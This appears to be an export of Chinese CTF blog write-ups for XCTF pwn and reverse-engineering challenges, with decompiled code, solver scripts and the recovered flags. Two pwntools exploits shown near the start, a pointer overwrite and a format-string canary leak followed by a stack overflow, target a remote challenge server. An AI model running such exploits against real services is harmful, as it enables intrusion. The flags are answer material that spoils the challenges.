接下来考虑怎么利用。程序最后会根据v14的值来判断该执行那个函数，看到有些人想要覆盖v14的值，我的做法就是保留v14=1然后去替换v3的值，因为即使替换掉v14，后面也会被修改。 下一步就是要控制v14的值不变，我的做法是在写入的时候先写入一个'\\0'，这样判断字符串长度的时候为0，直接跳出循环。exp如下： 123456789from pwn import *# io=process('./forgot')io=remote('111.198.29.45',40669)io.recvuntil('&gt;')io.sendline('a')payload='\\0'+'A'*0x1f+p32(0x80486cc)io.recvuntil('&gt;')io.sendline(payload)io.interactive() 得到flag 1cyberpeace{3a2c567e832c79478c593e5f6f334830} Mary_Morton题目里面一共有两个漏洞，并且都标明出来了，不需要自己去找 1234567891011121314151617181920212223242526272829303132333435363738void __fastcall __noreturn main(__int64 a1, char **a2, char **a3){ int v3; // [rsp+24h] [rbp-Ch] unsigned __int64 v4; // [rsp+28h] [rbp-8h] v4 = __readfsqword(0x28u); sub_4009FF(); puts(\"Welcome to the battle ! \"); puts(\"[Great Fairy] level pwned \"); puts(\"Select your weapon \"); while ( 1 ) { while ( 1 ) { sub_4009DA(); __isoc99_scanf(\"%d\", &amp;v3); if ( v3 != 2 ) break; sub_4008EB(); } if ( v3 == 3 ) { puts(\"Bye \"); exit(0); } if ( v3 == 1 ) sub_400960(); else puts(\"Wrong!\"); }}int sub_4009DA(){ puts(\"1. Stack Bufferoverflow Bug \"); puts(\"2. Format String Bug \"); return puts(\"3. Exit the battle \");} 选择2的话会进入一个包含格式化字符串漏洞的函数，选择1会进入一个有栈溢出漏洞的函数 12345678910111213141516171819202122232425262728293031//格式化字符串unsigned __int64 sub_4008EB(){ char buf; // [rsp+0h] [rbp-90h] unsigned __int64 v2; // [rsp+88h] [rbp-8h] v2 = __readfsqword(0x28u); memset(&amp;buf, 0, 0x80uLL); read(0, &amp;buf, 0x7FuLL); printf(&amp;buf, &amp;buf); return __readfsqword(0x28u) ^ v2;}//栈溢出unsigned __int64 sub_400960(){ char buf; // [rsp+0h] [rbp-90h] unsigned __int64 v2; // [rsp+88h] [rbp-8h] v2 = __readfsqword(0x28u); memset(&amp;buf, 0, 0x80uLL); read(0, &amp;buf, 0x100uLL); printf(\"-&gt; %s\\n\", &amp;buf); return __readfsqword(0x28u) ^ v2;}//目标函数int sub_4008DA(){ return system(\"/bin/cat ./flag\");} 如果checksec或者直接看到v2就可以发现，这个程序开了cannary保护，所以直接溢出是不行的，这时候可以考虑利用格式化字符串漏洞泄露cannary的值，因为进程没有中止就进入了下一个循环，所以cannary的值是不变的，这个时候选择利用栈溢出漏洞，覆盖返回地址为目标函数即可。这里虽然是64位，但是调用的函数没有参数，没必要构造很复杂的ROP链来控制程序执行流程。 exp如下： 123456789101112131415161718from pwn import *sys_addr=0x4008da# io=process('./Mary_Morton')io=remote('111.198.29.45',39178)io.recvuntil(\"3. Exit the battle \\n\")io.sendline(\"2\")io.sendline(\"%23$p\")cannary= int(io.recvline().strip('\\n'),16)print cannaryio.recvuntil(\"3. Exit the battle \\n\")io.sendline(\"1\")payload=\"\"payload+='a'*0x88payload+=p64(cannary)payload+=p64(0)payload+=p64(sys_addr)io.sendline(payload)io.interactive() 得到flag 1cyberpeace{8b06a4becaf5e73cd79ea7d283d0bd89}","link":"/2020/03/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%80%EF%BC%89/"},{"title":"攻防世界-re部分题解（一）","text":"攻防世界的题目质量还是比较高的，题目类型很多，难度也有一定的梯度，挺适合不断进阶学习。 insanityIDA打开，进入main，发现程序在生成随机数，然后随便输出一系列字符串中的某一个，找到这一系列字符串，发现了flag 12345678910111213int __cdecl main(int argc, const char **argv, const char **envp){ unsigned int v3; // eax unsigned int v4; // eax puts(\"Reticulating splines, please wait..\"); sleep(5u); v3 = time(0); srand(v3); v4 = rand(); puts((&amp;strs)[v4 % 0xA]); return 0;} 找到strs，其中flag 19447{This_is_a_flag} open-source这题真就连源代码都给了 12345678910111213141516171819202122232425262728293031323334#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main(int argc, char *argv[]) { if (argc != 4) { printf(\"what?\\n\"); exit(1); } unsigned int first = atoi(argv[1]); if (first != 0xcafe) { printf(\"you are wrong, sorry.\\n\"); exit(2); } unsigned int second = atoi(argv[2]); if (second % 5 == 3 || second % 17 != 8) { printf(\"ha, you won't get it!\\n\"); exit(3); } if (strcmp(\"h4cky0u\", argv[3])) { printf(\"so close, dude!\\n\"); exit(4); } printf(\"Brr wrrr grr\\n\"); unsigned int hash = first * 31337 + (second % 17) * 11 + strlen(argv[3]) - 1615810207; printf(\"Get your key: \"); printf(\"%x\\n\", hash); return 0;} 看一下源码，发现运行时要有三个参数，第一个参数给出来了，是0xcafe，第二个没有给，但是知道second%17==8，直接带到下面计算就行了，第三个是字符串的长度，为7，直接算出来就行了。 不过还需要注意，最后输出的时候是以16进制的形式输出 1c0ffee simple-unpack题如其名，拿到直接upx脱壳，毫无阻碍，IDA打开直接在main里看到flag 1flag{Upx_1s_n0t_a_d3liv3r_c0mp4ny} logmeinIDA打开，找到关键判断位置 1234567891011121314151617strcpy(v8, \":\\\"AL_RT^L*.?+6/46\"); v7 = 'ebmarah'; v6 = 7; printf(\"Welcome to the RC3 secure password guesser.\\n\", a2, a3); printf(\"To continue, you must enter the correct password.\\n\"); printf(\"Enter your guess: \"); __isoc99_scanf(\"%32s\", s); v3 = strlen(s); if ( v3 &lt; strlen(v8) ) sub_4007C0(v8); for ( i = 0; i &lt; strlen(s); ++i ) { if ( i &gt;= strlen(v8) ) ((void (*)(void))sub_4007C0)(); if ( s[i] != (char)(*((_BYTE *)&amp;v7 + i % v6) ^ v8[i]) ) ((void (*)(void))sub_4007C0)(); } v7本身是一个长整型，但是作为字符读取，由于小端序，所以转换成的字符要反序，然后经过下面的计算就可以了 123456v8 = ':\\\"AL_RT^L*.?+6/46'v7 = 'harambe's = ''for i in range(len(v8)): s += chr(ord(v7[i % 7]) ^ ord(v8[i]))print(s) 输出结果 1RC3-2016-XORISGUD python-trade见CG-CTF py交易 game见BUGKU 游戏过关 hello-ctf一串输入的字符串拷贝来拷贝去，实际上就是把输入的字符串变成16进制，所以直接从16进制转换成字符串就可以了 123s = '437261636b4d654a757374466f7246756e'flag = bytes.fromhex(s)print(flag) 直接输出flag 1CrackMeJustForFun getit同样是一道简单题，写个简单的逆运算就可以了 123456789101112s = 'c61b68366edeb7bdce3c6820314b7498't = ''v5 = 0while (v5 &lt; len(s)): if (v5 &amp; 1): v3 = 1 else: v3 = -1 t += chr(ord(s[v5]) + v3) v5 = v5 + 1t='SharifCTF{'+t+'}'print(t) 输出flag 1SharifCTF{b70c59275fcfa8aebf2d5911223c6589} re1IDA打开追踪字符串，发现flag和输入直接进行比较，找到flag的位置，然后将16进制转换位字符串然后逆序即可 1DUTCTF{We1c0met0DUTCTF} no-strings-attached这题有点意思，整个程序没有直接出现的字符串，先打开IDA看看，找到一个decrypt函数，一看就知道这个是最重要的部分，又不想再写脚本去算，所以干脆开虚拟机gdb动态调试，在decrypt处下断点，等运行完decrypt函数之后，发现程序把某个地址拷进了eax，所以用x/6sw $eax来查看，结果发现了flag 19447{you_are_an_international_mystery} csaw2013reversing3这题比较有意思，一打开输出的是乱码，用IDA打开发现这些代码没有解密，有一个解密程序但是没有运行，所以OD直接调试改汇编，先运行解密函数，然后跳转到MessageBoxA函数，在窗口中输出来的就是真正的flag，操作比较简单，就不赘述了。 1flag{reversing_is_not_that_hard!} maze见CG-CTF maze 666IDA打开看到了假flag，不管它，找到关键函数 1234567891011121314151617181920212223int __fastcall encode(const char *a1, __int64 a2){ char v3[32]; // [rsp+10h] [rbp-70h] char v4[32]; // [rsp+30h] [rbp-50h] char v5[40]; // [rsp+50h] [rbp-30h] int v6; // [rsp+78h] [rbp-8h] int i; // [rsp+7Ch] [rbp-4h] i = 0; v6 = 0; if ( strlen(a1) != key ) return puts(\"Your Length is Wrong\"); for ( i = 0; i &lt; key; i += 3 ) { v5[i] = key ^ (a1[i] + 6); v4[i + 1] = (a1[i + 1] - 6) ^ key; v3[i + 2] = a1[i + 2] ^ 6 ^ key; *(_BYTE *)(a2 + i) = v5[i]; *(_BYTE *)(a2 + i + 1LL) = v4[i + 1]; *(_BYTE *)(a2 + i + 2LL) = v3[i + 2]; } return a2;} 这里进行了一些运算，运算的结果要和一个已经定义的enflag字符串相同，所以很好逆，这里需要注意运算顺序，异或运算加括号，不然会先计算加减 123456789101112131415161718192021#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;string&gt;using namespace std;int main() { int key = 0x12; unsigned char a2[] = { 0x69, 0x7A, 0x77, 0x68, 0x72, 0x6F, 0x7A, 0x22, 0x22, 0x77, 0x22, 0x76, 0x2E, 0x4B, 0x22, 0x2E, 0x4E, 0x69 }; char a1[key+1]; for (int i = 0; i &lt; key; i += 3 ) { a1[i]=(a2[i]^key)-6; a1[i+1]=(a2[i+1]^key)+6; a1[i+2]=a2[i+2]^key^6; } cout&lt;&lt;a1&lt;&lt;endl; return 0;} 输出的flag为： 1unctf{b66_6b6_66b} Reversing-x64Elf-100没什么难度，找到关键函数 1234567891011121314151617signed __int64 __fastcall sub_4006FD(__int64 a1){ signed int i; // [rsp+14h] [rbp-24h] const char *v3; // [rsp+18h] [rbp-20h] const char *v4; // [rsp+20h] [rbp-18h] const char *v5; // [rsp+28h] [rbp-10h] v3 = \"Dufhbmf\"; v4 = \"pG`imos\"; v5 = \"ewUglpt\"; for ( i = 0; i &lt;= 11; ++i ) { if ( (&amp;v3)[i % 3][2 * (i / 3)] - *(char *)(i + a1) != 1 ) return 1LL; } return 0LL;} a1就是我们需要的flag了 123456789101112131415#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;string&gt;using namespace std;int main() { char v3[3][8] = {\"Dufhbmf\", \"pG`imos\", \"ewUglpt\"}; char a1[13]; for (int i = 0; i &lt;= 11; ++i) { a1[i] = v3[i % 3][2 * (i / 3)] - 1; } cout&lt;&lt;a1&lt;&lt;endl; return 0;} 输出的flag为： 1Code_Talkers","link":"/2020/02/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%80%EF%BC%89/"},{"title":"攻防世界-re部分题解（三）","text":"题目还不是很难，所以还是放在一起来写 tt3441810这题并不知道是在干什么，IDA打开是个dumpfile，打开给了很多16进制，看到了0x68这个经典数字（push指令的编码)，后面接了两个字符，看到fl，感觉有问题，找到后面很多个0x68，每个后买你都跟了两个字符，像是把flagpush进栈的操作，所以把这些数据导出，然后写个脚本跑一下，验证猜想 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;string&gt;using namespace std;int main() { unsigned char ida_chars[] = { 0x68, 0x66, 0x6C, 0x00, 0x00, 0x48, 0xBF, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x34, 0x24, 0x48, 0xBA, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x05, 0x68, 0x61, 0x67, 0x00, 0x00, 0x48, 0xBF, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x34, 0x24, 0x48, 0xBA, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x05, 0x68, 0x7B, 0x70, 0x00, 0x00, 0x48, 0xBF, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x34, 0x24, 0x48, 0xBA, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x05, 0x68, 0x6F, 0x70, 0x00, 0x00, 0x48, 0xBF, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x34, 0x24, 0x48, 0xBA, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x05, 0x68, 0x70, 0x6F, 0x00, 0x00, 0x48, 0xBF, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x34, 0x24, 0x48, 0xBA, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x05, 0x68, 0x70, 0x72, 0x00, 0x00, 0x48, 0xBF, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x34, 0x24, 0x48, 0xBA, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x05, 0x68, 0x65, 0x74, 0x00, 0x00, 0x48, 0xBF, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x34, 0x24, 0x48, 0xBA, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x05, 0x68, 0x7D, 0x0A, 0x00, 0x00, 0x48, 0xBF, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x34, 0x24, 0x48, 0xBA, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x05, 0x48, 0x31, 0xFF, 0x48, 0xB8, 0x3C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x05 }; int len = sizeof(ida_chars)/ sizeof(ida_chars[0]); string flag; int i =0; while(i!=len) { if(ida_chars[i]==0x68) { while(ida_chars[++i]!=0x00) { flag+=ida_chars[i]; } } else { i++; } } cout&lt;&lt;flag&lt;&lt;endl; return 0;} 输出flag 1flag{poppopret} 提交的时候只需要中间的部分 re2-cpp-is-awesome这题有很多string类，所以还是要慢慢分析 1234567891011121314151617181920212223242526272829303132333435363738394041__int64 __fastcall main(int a1, char **a2, char **a3){ char *v3; // rbx __int64 v4; // rax __int64 v5; // rdx __int64 v6; // rax __int64 v7; // rdx __int64 v8; // rdx __int64 v9; // rdx __int64 i; // [rsp+10h] [rbp-60h] char v12; // [rsp+20h] [rbp-50h] char v13; // [rsp+4Fh] [rbp-21h] __int64 v14; // [rsp+50h] [rbp-20h] int v15; // [rsp+5Ch] [rbp-14h] if ( a1 != 2 ) { v3 = *a2; v4 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"Usage: \", a3); v6 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(v4, v3, v5); std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(v6, \" flag\\n\", v7); exit(0); } std::allocator&lt;char&gt;::allocator(&amp;v13, a2, a3); std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::basic_string(&amp;v12, a2[1], &amp;v13); std::allocator&lt;char&gt;::~allocator(&amp;v13); v15 = 0; for ( i = std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::begin(&amp;v12); ; sub_400D7A(&amp;i) ) { v14 = std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::end(&amp;v12); if ( !sub_400D3D((__int64)&amp;i, (__int64)&amp;v14) ) break; v9 = *(unsigned __int8 *)sub_400D9A((__int64)&amp;i); if ( (_BYTE)v9 != off_6020A0[dword_6020C0[v15]] ) sub_400B56((__int64)&amp;i, (__int64)&amp;v14, v9); ++v15; } sub_400B73((__int64)&amp;i, (__int64)&amp;v14, v8); std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(&amp;v12); return 0LL;} 真正有用的内容只有一个for循环，在这之前我们输入的字符串被传入了v12，然后用迭代器进行循环，遍历整个字符串，每个字符被赋值给了v9，然后进行判断，如果判断可以通过，我们输入的就是正确的flag，判断的条件是v9 = off_6020A0[dword_6020C0[v15]]，一个嵌套索引，把数据导出之后很容易得到结果 12345678target = \"L3t_ME_T3ll_Y0u_S0m3th1ng_1mp0rtant_A_{FL4G}_W0nt_b3_3X4ctly_th4t_345y_t0_c4ptur3_H0wev3r_1T_w1ll_b3_C00l_1F_Y0u_g0t_1t\"dword_6020C0 = [36, 0, 5, 54, 101, 7, 39, 38, 45, 1, 3, 0, 13, 86, 1, 3, 101, 3, 45, 22, 2, 21, 3, 101, 0, 41, 68, 68, 1, 68, 43]flag = ''for i in dword_6020C0: # print(i) flag += target[i]print(flag) 输出结果 1ALEXCTF{W3_L0v3_C_W1th_CL45535} 流浪者这题是MFC，题目中的函数很多，打开发现输入有错误提示，还是从字符串入手，找到了几个很有用的函数 123456789101112131415161718192021BOOL __cdecl sub_4017F0(int a1){ BOOL result; // eax char Str1[28]; // [esp+D8h] [ebp-24h] int v3; // [esp+F4h] [ebp-8h] int v4; // [esp+F8h] [ebp-4h] v4 = 0; v3 = 0; while ( *(_DWORD *)(a1 + 4 * v4) &lt; 62 &amp;&amp; *(_DWORD *)(a1 + 4 * v4) &gt;= 0 ) { Str1[v4] = alphabet[*(_DWORD *)(a1 + 4 * v4)]; ++v4; } Str1[v4] = 0; if ( !strcmp(Str1, \"KanXueCTF2019JustForhappy\") ) result = pass(); else result = fail(); return result;} 更改了一些函数和变量名，更容易辨认，这个函数传入了a1之后，对a1之后的地址上的内容作为索引值依次连接组成了一个新的字符串，所以a1显然应该是一个地址，或者说是一个数组的首地址，而这个数组的内容我们很容易就可以得到，接着再看到底在哪里引用了这个函数 1234567891011121314151617181920212223242526272829303132333435363738394041int __thiscall sub_401890(CWnd *this){ struct CString *v1; // ST08_4 CWnd *v2; // eax int v3; // eax int v5[26]; // [esp+4Ch] [ebp-74h] int i; // [esp+B4h] [ebp-Ch] char *Str; // [esp+B8h] [ebp-8h] CWnd *v8; // [esp+BCh] [ebp-4h] v8 = this; v1 = (CWnd *)((char *)this + 100); v2 = CWnd::GetDlgItem(this, 1002); CWnd::GetWindowTextA(v2, v1); v3 = sub_401A30((char *)v8 + 100); Str = CString::GetBuffer((CWnd *)((char *)v8 + 100), v3); if ( !strlen(Str) ) return CWnd::MessageBoxA(v8, &amp;Qingshuru, 0, 0); for ( i = 0; Str[i]; ++i ) { if ( Str[i] &gt; 57 || Str[i] &lt; 48 ) { if ( Str[i] &gt; 122 || Str[i] &lt; 97 ) { if ( Str[i] &gt; 90 || Str[i] &lt; 65 ) fail(); else v5[i] = Str[i] - 29; } else { v5[i] = Str[i] - 87; } } else { v5[i] = Str[i] - 48; } } return sub_4017F0((int)v5);} 这个函数也很简单，把输入的内容赋给Str，然后对str里面的字符进行一个变换，把变换后的数组传给刚刚分析的那个函数，所以想要逆向解出输入的字符就很简单了 12345678910111213141516str1 = 'KanXueCTF2019JustForhappy'alphabet = 'abcdefghiABCDEFGHIJKLMNjklmn0123456789opqrstuvwxyzOPQRSTUVWXYZ'a1 = []for i in str1: j = alphabet.index(i) a1.append(j)# print(a1)flag = ''for i in a1: if 0 &lt;= i &lt;= 9: flag += chr(i + 48) elif i &lt;= 35: flag += chr(i + 87) else: flag += chr(i + 29)print(flag) 根据题目要求把输出的内容套上flag 1flag{j0rXI4bTeustBiIGHeCF70DDM} easyRE1毫无意义的题目，打开就能看到flag，套上flag{}直接交上去就行了 debug题如其名，peid打开发现是c#，所以直接dnspy打开，发现flag是直接计算出来的，并且没有进行任何的反调试，所以直接调试运行几步就得到了flag 1flag{967DDDFBCD32C1F53527C221D9E40A0B} Guess-the-Number这题是java逆向，cfr反编译之后，查看源代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445import java.io.PrintStream;import java.math.BigInteger;public class guess { static String XOR(String _str_one, String _str_two) { BigInteger i1 = new BigInteger(_str_one, 16); BigInteger i2 = new BigInteger(_str_two, 16); BigInteger res = i1.xor(i2); String result = res.toString(16); return result; } public static void main(String[] args) { block5: { int guess_number = 0; int my_num = 349763335; int my_number = 1545686892; int flag = 345736730; if (args.length &gt; 0) { try { guess_number = Integer.parseInt(args[0]); if (my_number / 5 == guess_number) { String str_one = \"4b64ca12ace755516c178f72d05d7061\"; String str_two = \"ecd44646cfe5994ebeb35bf922e25dba\"; my_num += flag; String answer = guess.XOR(str_one, str_two); System.out.println(\"your flag is: \" + answer); break block5; } System.err.println(\"wrong guess!\"); System.exit(1); } catch (NumberFormatException e) { System.err.println(\"please enter an integer \\nexample: java -jar guess 12\"); System.exit(1); } } else { System.err.println(\"wrong guess!\"); int num = 1000000; ++num; System.exit(1); } } }} 程序很简单，我们当然可以根据算法来算出来flag的值，但是完全可以得到需要输入的数，所以直接运行就好了 1&gt;java -jar Guess-the-Number.jar 309137378 输出结果 1your flag is: a7b08c546302cc1fd2a4d48bf2bf2ddb 直接提交即可 EASYHOOK这题很有意思，值得好好分析一下，IDA打开，找到main函数 123456789101112131415161718192021222324252627282930int __cdecl main(int argc, const char **argv, const char **envp){ int result; // eax HANDLE v4; // eax DWORD NumberOfBytesWritten; // [esp+4h] [ebp-24h] char Buffer; // [esp+8h] [ebp-20h] puts((int)aPleaseInputFla); scanf(a31s, &amp;Buffer); if ( strlen(&amp;Buffer) == 19 ) { sub_401220(); v4 = CreateFileA(FileName, 0x40000000u, 0, 0, 2u, 0x80u, 0); WriteFile(v4, &amp;Buffer, 19u, &amp;NumberOfBytesWritten, 0); sub_401240(&amp;Buffer, &amp;NumberOfBytesWritten); if ( NumberOfBytesWritten == 1 ) puts((int)aRightFlagIsYou); else puts((int)aWrong); system(aPause); result = 0; } else { puts((int)aWrong); system(aPause); result = 0; } return result;} 第一反应当然是查看一下sub_401240()的内容，毕竟这是最后一个调用NumberOfBytesWritten的函数，而这个值，经过writeFile()之后应该是19 1234567891011121314151617181920212223242526signed int __cdecl sub_401240(const char *a1, _DWORD *a2){ signed int result; // eax unsigned int v3; // kr04_4 char v4[24]; // [esp+Ch] [ebp-18h] result = 0; strcpy(v4, \"This_is_not_the_flag\"); v3 = strlen(a1) + 1; if ( (signed int)(v3 - 1) &gt; 0 ) { while ( v4[a1 - v4 + result] == v4[result] ) { if ( ++result &gt;= (signed int)(v3 - 1) ) { if ( result == 21 ) { result = (signed int)a2; *a2 = 1; } return result; } } } return result;} 看到This_is_not_the_flag感觉有些不对，仔细观察发现这个字符串有20的字符，而下面的判断需要我们的输入和这个字符串相等，但是我们只输入19个字符，所以这个函数永远不可能返回我们想要的结果，肯定是有什么东西被漏掉了，所以返回main，前面还有一个sub_401220()没有看 123456789101112131415161718int sub_401220(){ HMODULE v0; // eax DWORD v2; // eax v2 = GetCurrentProcessId(); hProcess = OpenProcess(0x1F0FFFu, 0, v2); v0 = LoadLibraryA(LibFileName); dword_40C9C4 = (int)GetProcAddress(v0, unk_40A05C);// 找到writefile的地址 lpAddress = (LPVOID)dword_40C9C4; if ( !dword_40C9C4 ) return puts((int)&amp;dword_40A044); unk_40C9B4 = *(_DWORD *)lpAddress; *((_BYTE *)&amp;unk_40C9B4 + 4) = *((_BYTE *)lpAddress + 4); byte_40C9BC = 0xE9u; dword_40C9BD = (char *)sub_401080 - (char *)lpAddress - 5; return sub_4010D0();} 在这里发现了问题，这里找到了储存writefile()地址的位置，然后保存前五个字节的内容，后面进行了一些赋值，看到0xE9就发现这里想要修改writefile()函数地址，跳转到另一个函数sub_401080()，然后函数进入sub_4010D0() 12345678910BOOL sub_4010D0(){ DWORD v1; // [esp+4h] [ebp-8h] DWORD flOldProtect; // [esp+8h] [ebp-4h] v1 = 0; VirtualProtectEx(hProcess, lpAddress, 5u, 4u, &amp;flOldProtect); WriteProcessMemory(hProcess, lpAddress, &amp;byte_40C9BC, 5u, 0); return VirtualProtectEx(hProcess, lpAddress, 5u, flOldProtect, &amp;v1);} 这个函数把刚刚的修改写进了相应的地址，此时程序一旦调用writefile()，就会跳转到sub_401080()，所以转到这个函数 1234567891011int __stdcall sub_401080(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped){ signed int v5; // ebx v5 = sub_401000((int)lpBuffer, nNumberOfBytesToWrite); sub_401140(); WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped); if ( v5 ) *lpNumberOfBytesWritten = 1; return 0;} 如果sub_401000()返回值是1，就会输出我们的输入是正确的，sub_401140()是用来恢复writefile()函数的地址，就不再赘述，所以重点就是sub_401000() 12345678910111213141516171819202122232425262728293031323334353637383940signed int __cdecl sub_401000(int a1, signed int a2){ char v2; // al char v3; // bl char v4; // cl int v5; // eax v2 = 0; if ( a2 &gt; 0 ) { do { if ( v2 == 18 ) { *(_BYTE *)(a1 + 18) ^= 0x13u; } else { if ( v2 % 2 ) v3 = *(_BYTE *)(v2 + a1) - v2; else v3 = *(_BYTE *)(v2 + a1 + 2); *(_BYTE *)(v2 + a1) = v2 ^ v3; } ++v2; } while ( v2 &lt; a2 ); } v4 = 0; if ( a2 &lt;= 0 ) return 1; v5 = 0; while ( aAjygkfmSv8mln[v5] == *(_BYTE *)(v5 + a1) ) { v5 = ++v4; if ( v4 &gt;= a2 ) return 1; } return 0;} 这里的操作就很简单了，也不需要再多说，我们的输入经过处理后如果和内存中的字符串相同，就对了 1234567891011121314151617181920212223#include &lt;iostream&gt;using namespace std;int main() { char str[20] = \"ajygkFm.\\x7F_~-SV{8mLn\"; char a1[20] = {0}; for (int i = 0; i &lt; 19; i++) { if (i == 18) { a1[i] = str[18] ^ 0x13; } if (i % 2) { a1[i] = (str[i] ^ i) + i; } else { a1[i + 2] = (str[i] ^ i); } } a1[0]='f'; cout &lt;&lt; a1 &lt;&lt; endl;} 这里有一点需要注意，这个程序是没法检测第一位输入的，中间的过程也完全没有用到第一位，所以根据输出结果手动添加了’f’，输出 1flag{Ho0k_w1th_Fun} 可以验证一下，第一位其实并不影响结果 发现第一位改成其他的字符也是正确的 reverse-for-the-holy-grail-350这题还算是比较简单的题目，很容易就可以找到关键函数，然后发现所有的数据处理和验证全部都在这个函数里面 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576__int64 __fastcall stringMod(__int64 *a1){ __int64 v1; // r9 __int64 v2; // r10 __int64 i; // rcx signed int v4; // er8 int *v5; // rdi int *v6; // rsi signed int v7; // ecx signed int v8; // er9 int v9; // er10 unsigned int v10; // eax int v11; // esi int v12; // esi int v14[24]; // [rsp+0h] [rbp-60h] int _48[24]; // [rsp+48h] [rbp-18h] memset(v14, 0, 0x48uLL); v1 = a1[1]; if ( v1 ) { v2 = *a1; i = 0LL; v4 = 0; do { v12 = *(char *)(v2 + i); v14[i] = v12; if ( 3 * ((unsigned int)i / 3) == (_DWORD)i &amp;&amp; v12 != firstchar[(unsigned int)i / 3] )// 3的倍数等于firstchar v4 = -1; ++i; } while ( i != v1 ); } else { v4 = 0; } v5 = v14; v6 = v14; v7 = 666; do { *v6 = v7 ^ *(unsigned __int8 *)v6; v7 += v7 % 5; ++v6; } while ( _48 != v6 ); v8 = 1; v9 = 0; v10 = 1; v11 = 0; do { if ( v11 == 2 ) { if ( *v5 != thirdchar[v9] ) v4 = -1; if ( v10 % *v5 != masterArray[v9] ) v4 = -1; ++v9; v10 = 1; v11 = 0; } else { v10 *= *v5; if ( ++v11 == 3 ) v11 = 0; } ++v8; ++v5; } while ( v8 != 19 ); return (unsigned int)(v7 * v4);} 发现把输入分成了三个部分，处理起来也很简单，写脚本处理 1234567891011121314151617181920212223242526272829303132333435#include &lt;iostream&gt;using namespace std;int main() { int firstchar[8] = {65, 105, 110, 69, 111, 97}; int thirdchar[8] = {751, 708, 732, 711, 734, 764}; int masterArray[6] = {471, 12, 580, 606, 147, 108}; int xor_[24] = {0}; char flag[24] = {0}; xor_[0] = 666; for (int i = 1; i &lt; 24; i++) { xor_[i] = xor_[i - 1] + xor_[i - 1] % 5; } for (int i = 0; i &lt; 6; i++) { flag[3 * i] = firstchar[i]; flag[3 * i + 2] = thirdchar[i] ^ xor_[3 * i + 2]; for (int j = 48; j &lt; 122; j++) { if ((j &gt;= 48 &amp;&amp; j &lt;= 57) || (j &gt;= 65 &amp;&amp; j &lt;= 90) || (j &gt;= 97 &amp;&amp; j &lt;= 122)) { int tmp = j ^xor_[3 * i + 1]; if (tmp * (flag[3 * i] ^ xor_[3 * i]) % thirdchar[i] == masterArray[i]) { flag[3 * i + 1] = j; break; } } else continue; } } cout &lt;&lt; flag &lt;&lt; endl;} 输出flag，再套上main里面提供的格式即可 1tuctf{AfricanOrEuropean?} android-app-100反编译之后发现还调用了c的库，于是IDA打开so文件，看到了混淆，但是内容比较好猜，所以直接找到字符串计算md5或者在apk里面提交就好了 